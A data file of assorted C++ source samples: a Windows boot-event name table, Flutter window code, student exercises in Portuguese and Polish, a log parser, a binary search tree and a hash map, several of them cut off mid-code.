{SIPAEV_POST_CODE, L\"EV_Post_Code\"},\n    {SIPAEV_UNUSED, L\"EV_Unused\"},\n    {SIPAEV_NO_ACTION, L\"EV_No_Action\"},\n    {SIPAEV_SEPARATOR, L\"EV_Separator\"},\n    {SIPAEV_ACTION, L\"EV_Action\"},\n    {SIPAEV_EVENT_TAG, L\"EV_Event_Tag\"},\n    {SIPAEV_S_CRTM_CONTENTS, L\"EV_CRTM_Contents\"},\n    {SIPAEV_S_CRTM_VERSION, L\"EV_CRTM_Version\"},\n    {SIPAEV_CPU_MICROCODE, L\"EV_CPU_Microcode\"},\n    {SIPAEV_PLATFORM_CONFIG_FLAGS, L\"EV_Platform_Config_Flags\"},\n    {SIPAEV_TABLE_OF_DEVICES, L\"EV_Table_Of_Devices\"},\n    {SIPAEV_COMPACT_HASH, L\"EV_Compact_Hash\"},\n    {SIPAEV_IPL, L\"EV_IPL\"},\n    {SIPAEV_IPL_PARTITION_DATA, L\"EV_IPL_Partition_Data\"},\n    {SIPAEV_NONHOST_CODE, L\"EV_NonHost_Code\"},\n    {SIPAEV_NONHOST_CONFIG, L\"EV_NonHost_Config\"},\n    {SIPAEV_NONHOST_INFO, L\"EV_NonHost_Info\"},\n    {SIPAEV_EFI_EVENT_BASE, L\"EV_EFI_Event_Base\"},\n    {SIPAEV_EFI_VARIABLE_DRIVER_CONFIG, L\"EV_EFI_Variable_Driver_Config\"},\n    {SIPAEV_EFI_VARIABLE_BOOT, L\"EV_EFI_Variable_Boot\"},\n    {SIPAEV_EFI_BOOT_SERVICES_APPLICATION, L\"EV_EFI_Boot_Services_Application\"},\n    {SIPAEV_EFI_BOOT_SERVICES_DRIVER, L\"EV_EFI_Boot_Services_Driver\"},\n    {SIPAEV_EFI_RUNTIME_SERVICES_DRIVER, L\"EV_EFI_Runtime_Services_Driver\"},\n    {SIPAEV_EFI_GPT_EVENT, L\"EV_EFI_GPT_Event\"},\n    {SIPAEV_EFI_ACTION, L\"EV_EFI_Action\"},\n    {SIPAEV_EFI_PLATFORM_FIRMWARE_BLOB, L\"EV_EFI_Platform_Firmware_Blog\"},\n    {SIPAEV_EFI_HANDOFF_TABLES, L\"EV_EFI_Handoff_Tables\"},\n    {0xFFFFFFFF, L\"EV_Unknown\"}\n};\n\nEVENT_TYPE_DATA SipaId[] = {\n    {SIPAEVENT_TRUSTBOUNDARY, L\"Trustboundary\"},\n    {SIPAEVENT_ELAM_AGGREGATION, L\"ELAM_Aggregation\"},\n    {SIPAEVENT_LOADEDMODULE_AGGREGATION, L\"LoadedModule_Aggregation\"},\n    {SIPAEVENT_TRUSTPOINT_AGGREGATION, L\"TrustPoint_Aggregation\"},\n    {SIPAERROR_FIRMWAREFAILURE, L\"FirmwareFailure\"},\n    {SIPAERROR_TPMFAILURE, L\"TpmFailure\"},\n    {SIPAERROR_INTERNALFAILURE, L\"InternalFailure\"},\n    {SIPAEVENT_INFORMATION, L\"Information\"},\n    {SIPAEVENT_BOOTCOUNTER, L\"BootCounter\"},\n    {SIPAEVENT_TRANSFER_CONTROL, L\"Transfer_",
    "#include <iostream> <locale>\n\nusing namespace std;\nint main() {\n\tlocale::global(locale(\"pt_BR.UTF-8\"));\n\n\n\t//ATIVIDADE 1\n\t/*int numero = 1;\n\twhile (numero <= 10) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 1;\n\t}*/\n\n\t\n\t//ATIVIDADE 2\n\t/*int tab1;\n\tcout << \"Informe um n\u00famero: \";\n\tcin >> tab1;\n\tfor (int j = 1; j <= 10; j++) {\n\t\tint resultado = tab1 * j;\n\t\tcout << resultado << \"\\n\";\n\t\tcout << tab1 << \" x \" << j << \" = \" << resultado << \"\\n\";\n\t}*/\n\n\n\t//ATIVIDADE 3\n\t/*int numero = 0;\n\twhile (numero <= 50) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 5;\n\t}*/\n\n\n\t//ATIVIDADE 4\n\t/*int numero;\n\t\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero <= 100){\n\t\t\tcout << \"N\u00famero comum\" << \"\\n\";\n\t\t}\n\t\telse if (numero > 100) {\n\t\t\tcout << \"N\u00daMERO ESPECIAL\" << \"\\n\";\n\t\t}\n\t}*/\n\n\n\t//ATIVIDADE 5\n\t/*int numero = 1;\n\twhile (numero <= 31) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 2;\n\t}*/\n\t\n\n\t//ATIVIDADE 6\n\t/*int numero;\n\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero > 0) {\n\t\t\tcout << \"N\u00famero Positivo\" << \"\\n\";\n\t\t}\n\t\telse if (numero < 0) {\n\t\t\tcout << \"N\u00famero Negativo\" << \"\\n\";\n\t\t}\n\t\telse {\n\t\t\tcout << \"O n\u00famero \u00e9 ZERO\" << \"\\n\";\n\t\t}\n\t}*/\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff// QuizletXD.cpp : Ten plik zawiera funkcj\u0119 \u201emain\u201d. W nim rozpoczyna si\u0119 i ko\u0144czy wykonywanie programu.\n//CTRL + F5 odpalasz \n\n#include<iostream>\n#include<cstdlib>\n#include<fstream>\n#include<string>\n#include<ctime>\n#include<cmath>\nusing namespace std;\n\nint ILOSC_SLOW = 318; // Tu wpisujesz ile jest wierszy w pliku (te poziome(plasko)) po czym naciskasz   CTRL + S  (plus oznacza, ze te dwa guziki xD)\n\n\nint generowanieNumeruSlowaWisielec() {\n\tsrand(time(NULL));\n\n\tint numerSlowa = (rand() * 2137 % (ILOSC_SLOW * 2));\n\tif (numerSlowa % 2 == 0) {\n\t\tnumerSlowa++;\n\t}\n\treturn numerSlowa;\n}\n\nvoid generowanieSlowaDoOdgadniecia(int numerSlowa, char* slowoDoOdgadniecia) {\n\tchar pusteWczytanie[80] = { 0 };\n\tfstream wczytanieSlowaZPliku;\n\twczytanieSlowaZPliku.open(\"Slowniczek_muzyczny.txt\", ios::in);// pomiedzy znakami \"Tu_Wpisujesz_Nazwe_Swojego_Pliku.txt\" nie zapomnij .txt na ko\u0144cu a potem CTRL+S    \n\t//Nazwa pliku musi by\u0107 bez polskich znakow i zamiast spacji wpisz _ (Shift + -  =  _  )\n\tfor (int j = 1; j < numerSlowa; j++) {\n\t\twczytanieSlowaZPliku >> pusteWczytanie;\n\t}\n\twczytanieSlowaZPliku >> slowoDoOdgadniecia;\n}\n\nint main()\n{\n\tbool kontynuacja = true;\n\tint punkty = 0;\n\tint bledy = 0;\n\tint przyklad = 0;\n\twhile (kontynuacja) {\n\t\tint numer = generowanieNumeruSlowaWisielec();\n\t\tprzyklad++;\n\t\tchar slowo_do_odgadniecia[80] = { 0 };\n\t\tchar slowo_do_odgadniecia2[80] = { 0 };\n\t\tgenerowanieSlowaDoOdgadniecia(numer, slowo_do_odgadniecia);\n\t\tgenerowanieSlowaDoOdgadniecia(numer + 1, slowo_do_odgadniecia2);\n\t\tstd::cout << \"Slowo do odgadniecia nr.\" << przyklad << \" to:\\n\" << slowo_do_odgadniecia << endl;\n\t\tchar slowo_zgadywane[30] = { 0 };\n\t\tcin >> slowo_zgadywane;\n\t\tcout << slowo_do_odgadniecia2 << endl << \"Czy napisalas dobrze?\\n 1=tak\\t2=nie\\t3=inne tlumaczenie\\ninne = koniec\\n\";\n\t\tint dobrze = 0;\n\t\tcin >> dobrze;\n\t\tif (dobrze == 1) {\n\t\t\tpunkty++;\n\t\t}\n\t\telse if (dobrze == 2) {\n\t\t\tbledy++;\n\t\t}\n\t\telse if (dobrze == 3) {\n\t\t\tprzyklad--;\n\t\t}\n\t\telse {\n\t\t\tcout << \"WTF?! co ty wpisalas? Przestajemy sie lubic i sie wylaczam \\n>:(\\n\";\n\t\t\tkontynuacja = false;\n\t\t}\n\t\tcout << \"Twoje punkty to:\\nDobrze:\" << punkty << \"\\nzle:\\t\" << bledy << endl;\n\t\tsystem(\"PAUSE\");\n\t\tsystem(\"CLS\");\n\t}\n}\n\n\n\n// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania\n// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie\n\n// Porady dotycz\u0105ce rozpoczynania pracy:\n//   1. U\u017cyj okna Eksploratora rozwi\u0105za\u0144, aby doda\u0107 pliki i zarz\u0105dza\u0107 nimi\n//   2. U\u017cyj okna programu Team Explorer, aby nawi\u0105za\u0107 po\u0142\u0105czenie z kontrol\u0105 \u017ar\u00f3d\u0142a\n//   3. U\u017cyj okna Dane wyj\u015bciowe, aby sprawdzi\u0107 dane wyj\u015bciowe kompilacji i inne komunikaty\n//   4. U\u017cyj okna Lista b\u0142\u0119d\u00f3w, aby zobaczy\u0107 b\u0142\u0119dy\n//   5. Wybierz pozycj\u0119 Projekt > Dodaj nowy element, aby utworzy\u0107 nowe pliki kodu, lub wybierz pozycj\u0119 Projekt > Dodaj istniej\u0105cy element, aby doda\u0107 istniej\u0105ce pliku kodu do projektu\n//   6. Aby w przysz\u0142o\u015bci ponownie otworzy\u0107 ten projekt, przejd\u017a do pozycji Plik > Otw\u00f3rz > Projekt i wybierz plik sln\n",
    "\n// LogiParser.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\ntypedef unsigned char Byte;\ntypedef int Int32;\n\n/// <summary>\n/// A structure which represents a message.\n/// </summary>\nstruct LogiMessage\n{\n    LogiMessage() : sequenceNumber(0), length(0), message(NULL) {}\n\n    Int32 sequenceNumber;\n    Int32 length;\n    char* message;\n};\n\n/// <summary>\n/// Checks the endianness of the system.\n/// </summary>\n/// <returns>true if the system is little-endian.</returns>\nbool isLittleEndian()\n{\n    const int value = 0x01;\n    const void* address = static_cast<const void*>(&value);\n    const unsigned char* leastSignificantAddress = static_cast<const unsigned char*>(address);\n    return *leastSignificantAddress == 0x01;\n}\n\n/// <summary>\n/// Helper function for endianness conversion.\n/// </summary>\n/// <typeparam name=\"T\">The type of the argument.</typeparam>\n/// <param name=\"pObj\">The pointer to the object.</param>\ntemplate <typename T>\nvoid endSwap(T* pObj)\n{\n    Byte* pMem = reinterpret_cast<Byte*>(pObj);\n    reverse(pMem, pMem + sizeof(T));\n}\n\nint main(int argc, char* argv[])\n{\n    // Check whether the file name is supplied.\n    if (argc < 2)\n    {\n        cout << \"Please specify a file name.\\n\";\n        return 1;\n    }\n\n    // Open the file.\n    ifstream stream(argv[1], ios::binary);\n\n    // Check whether the file is good.\n    if (!stream.good())\n    {\n        cout << \"Could not read the file.\\n\";\n        return 1;\n    }\n\n    // Read the file into LogiMessage items.\n    vector<LogiMessage> messages;\n    while (!stream.eof())\n    {\n        LogiMessage msg;\n\n        // Read the length.\n        stream.read((char*)&msg.length, sizeof(Int32));\n\n        // If there is no message, skip.\n        if (!msg.length)\n            continue;\n\n        // Read the sequence number.\n        stream.read((char*)&msg.sequenceNumber, sizeof(Int32));\n\n        // If the system is not little-endian, swap the bytes.\n        if (!isLittleEndian())\n        {\n            endSwap(&msg.sequenceNumber);\n            endSwap(&msg.length);\n        }\n\n        // Read the actual message content.\n        msg.message = (char*)malloc(msg.length + 1);\n        stream.read(msg.message, msg.length);\n        msg.message[msg.length] = '\\0';\n\n        messages.push_back(msg);\n    }\n\n    // Close the file resource.\n    stream.close();\n\n    // Output the messages, or they can be utilised in another way.\n    for (LogiMessage msg : messages)\n    {\n        printf(\"%d| %s\\n\", msg.sequenceNumber, msg.message);\n    }\n\n    return 0;\n}\n",
    "#include \"tree.h\"\n#include <iostream>\n\nBinarySearchTree::BinarySearchTree() {\n    root = nullptr;\n}\n\nBinarySearchTree::~BinarySearchTree() {\n    deleteTree(root);\n}\n\nvoid BinarySearchTree::insert(int key) {\n    root = insertRecursive(root, key);\n}\n\nNode* BinarySearchTree::insertRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        Node* newNode = new Node();\n        newNode->key = key;\n        newNode->left = nullptr;\n        newNode->right = nullptr;\n        return newNode;\n    }\n\n    if (key < node->key) {\n        node->left = insertRecursive(node->left, key);\n    } else if (key > node->key) {\n        node->right = insertRecursive(node->right, key);\n    }\n\n    return node;\n}\n\nbool BinarySearchTree::search(int key) {\n    return searchRecursive(root, key);\n}\n\nbool BinarySearchTree::searchRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        return false;\n    }\n\n    if (key == node->key) {\n        return true;\n    } else if (key < node->key) {\n        return searchRecursive(node->left, key);\n    } else {\n        return searchRecursive(node->right, key);\n    }\n}\n\nvoid BinarySearchTree::remove(int key) {\n    root = removeRecursive(root, key);\n}\n\nNode* BinarySearchTree::removeRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        return nullptr;\n    }\n\n    if (key < node->key) {\n        node->left = removeRecursive(node->left, key);\n    } else if (key > node->key) {\n        node->right = removeRecursive(node->right, key);\n    } else {\n        if (node->left == nullptr && node->right == nullptr) {\n            delete node;\n            return nullptr;\n        } else if (node->left == nullptr) {\n            Node* temp = node->right;\n            delete node;\n            return temp;\n        } else if (node->right == nullptr) {\n            Node* temp = node->left;\n            delete node;\n            return temp;\n        } else {\n            Node* temp = findMin(node->right);\n            node->key = temp->key;\n            node->right = removeRecursive(node->right, temp->key);\n        }\n    }\n\n    return node;\n}\n\nNode* BinarySearchTree::findMin(Node* node) {\n    while (node->left != nullptr) {\n        node = node->left;\n    }\n    return node;\n}\n\nvoid BinarySearchTree::inorderTraversal() {\n    inorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::inorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        inorderTraversalRecursive(node->left);\n        std::cout << node->key << \" \";\n        inorderTraversalRecursive(node->right);\n    }\n}\n\nvoid BinarySearchTree::preorderTraversal() {\n    preorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::preorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        std::cout << node->key << \" \";\n        preorderTraversalRecursive(node->left);\n        preorderTraversalRecursive(node->right);\n    }\n}\n\nvoid BinarySearchTree::postorderTraversal() {\n    postorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::postorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        postorderTraversalRecursive(node->left);\n        postorderTraversalRecursive(node->right);\n        std::cout << node->key << \" \";\n    }\n}\n\nvoid BinarySearchTree::deleteTree(Node* node) {\n    if (node != nullptr) {\n        deleteTree(node->left);\n        deleteTree(node->right);\n        delete node;\n    }\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\n#include \"map.h\"\n\n// Should be copied from assignment 3: \n\nint case_insensitive_cmp::operator( ) \n      ( const std::string& s1, const std::string& s2 ) const\n{\n   for (size_t i = 0; i < std::min(s1.size(), s2.size()); i ++) {\n      char a = s1[i], b = s2[i];\n\n      if (a >= 'A' && a <= 'Z') a = char((int)a + 32);\n      if (b >= 'A' && b <= 'Z') b = char((int)b + 32);\n\n\n      if (a == b) continue;\n      if (a < b) return -1;\n      else return 1;\n\n   }\n   if (s1.size() == s2.size()) return 0;\n   else if (s1.size() < s2.size()) return -1;\n   else return 1;\n}\n\n\n// Must be written:\n\nsize_t case_insensitive_hash::operator( ) ( const std::string& s ) const\n{\n   std::hash<std::string> h;\n   std::string s1 = s;\n\n   for (size_t i = 0; i < s1.size(); i ++) {\n\n      if (s1[i] >= 'A' && s1[i] <= 'Z') s1[i] = char((int)s1[i] + 32);\n      \n   }\n\n   return h(s1);\n\n} \n\nauto map::getbucket( const keytype& key ) -> buckettype& \n{\n   keyhash hh;\n   size_t idx = hh(key) % buckets.size();\n   buckettype& bucket = buckets[idx];\n   return bucket;\n}\n\nauto map::getbucket( const keytype& key ) const -> const buckettype& \n{\n   keyhash hh;\n   size_t idx = hh(key) % buckets.size();\n   const buckettype& bucket = buckets[idx];\n   return bucket;\n}\n\nauto map::find( const keytype& key, buckettype& bk ) \n-> buckettype::iterator\n{\n   map::keycmp cmp;\n\n   for (auto it = bk.begin(); it != bk.end(); it++) {\n      // (*it).first\n      // (*it).second\n\n      if ( cmp (it->first, key) == 0 ) {\n         return it;\n      }\n\n   }\n\n   return bk.end();\n}\n\nauto map::find( const keytype& key, const buckettype& bk )\n-> buckettype::const_iterator\n{\n   map::keycmp cmp;\n\n   for (auto it = bk.begin(); it != bk.end(); it++) {\n      // (*it).first\n      // (*it).second\n\n      if ( cmp (it->first, key) == 0 ) {\n         return it;\n      }\n\n   }\n\n   return bk.end();\n\n}\n\n\nsize_t map::nrbuckets_needed( size_t sz ) const\n{\n   for (size_t i = 3;; i *= 3) {\n      if (i * max_load_factor >= sz) {\n         return i;\n      }\n   }\n}\n\nvoid map::rehash( size_t nrbuckets ) \n{\n   auto oldbuckets = \n      std::exchange( buckets, std::vector< buckettype > ( nrbuckets ));\n\n   // In this way, you can use method getbucket( ) for reinserting.\n\n   for (size_t i = 0; i < oldbuckets.size(); i ++) {\n      auto bucket = oldbuckets[i];\n      // bucket is list\n\n      for (auto it = bucket.begin(); it != bucket.end(); it++) {\n         // it->first\n         // it->second\n\n         auto& ls = getbucket(it->first);\n\n         ls.push_back(*it);\n\n      }\n\n   }\n\n   \n\n}\n\n\nbool map::contains( const keytype& key ) const\n{\n   auto& ls = getbucket(key);\n\n   if (find (key, ls) == ls.end()) {\n      return false;\n   }\n   else {\n      return true;\n   }\n\n}\n\n\nbool map::insert( const keytype& key, const valtype& val )\n{\n   auto& ls = getbucket(key);\n   if (find(key, ls) != ls.end()) {\n      return false;\n   }\n   else {\n\n      if (rehash_needed(current_size + 1 )) {\n\n         rehash( nrbuckets_needed( current_size + 1 ));\n         auto& ls2 = getbucket (key);\n         ls2.push_back ( {key, val} );\n\n      }\n      else {  \n\n         ls.push_back ( {key, val} );\n\n      }\n      current_size ++;\n      return true;\n   }\n}\n\nauto map::at( const keytype& key ) const -> const valtype&\n{\n   // If you want to store the bucket of key, make sure to use\n   // a reference (not a copy). \n   auto& ls = getbucket(key);\n   buckettype::const_iterator it = find (key, ls);\n\n   if (it == ls.end()) {\n      throw std::out_of_range (\"blah\");\n   }\n   else {\n      const valtype& x = it->second;\n      return x;\n   }\n\n\n\n}\n\nauto map::at( const keytype& key ) -> valtype&\n{\n   // If you want to store the bucket of key, make sure to use\n   // a reference (not a copy).\n   auto& ls = getbucket(key);\n   buckettype::iterator it = find (key, ls);\n   if (it == ls.end()) {\n      throw std::out_of_range (\"blah\");\n   }\n   else {\n      valtype& x = it->second;\n      return x;\n   }\n\n}\n\nauto map::operator[] ( const keytype& key ) -> valtype& \n{\n   auto& ls = getbucket(key);\n   buckettype::iterator it = find (key, ls);\n   if (it == ls.end()) {\n      current_size ++;\n      // create new\n\n      if (rehash_needed(current_size + 1 )) {\n\n         rehash( nrbuckets_needed( current_size + 1 ));\n         auto& ls2 = getbucket (key);\n         ls2.push_back( { key, valtype( ) } );\n\n         valtype& x = ls2.back().second;\n\n         return x;\n\n      }\n      else {  \n\n         ls.push_back( { key, valtype( ) } );\n\n         valtype& x = ls.back().second;\n\n         return x;\n\n      }\n\n\n   }\n   else {\n      valtype& x = it->second;\n      return x;\n   }\n}\n\nbool map::erase( const keytype& key ) \n{\n   auto& ls = getbucket(key);\n   buckettype::iterator it = find (key, ls);\n\n   if (it == ls.end()) {\n      // doesn't exist\n      return false;\n   }\n   else {\n      ls.erase (it);\n      current_size --;\n      return true;\n\n   }\n}\n\nsize_t map::size( ) const\n{\n   return current_size;\n}\n\nbool map::empty( ) const\n{\n   if (current_size == 0) return true;\n   else return false;\n}\n\nvoid ",
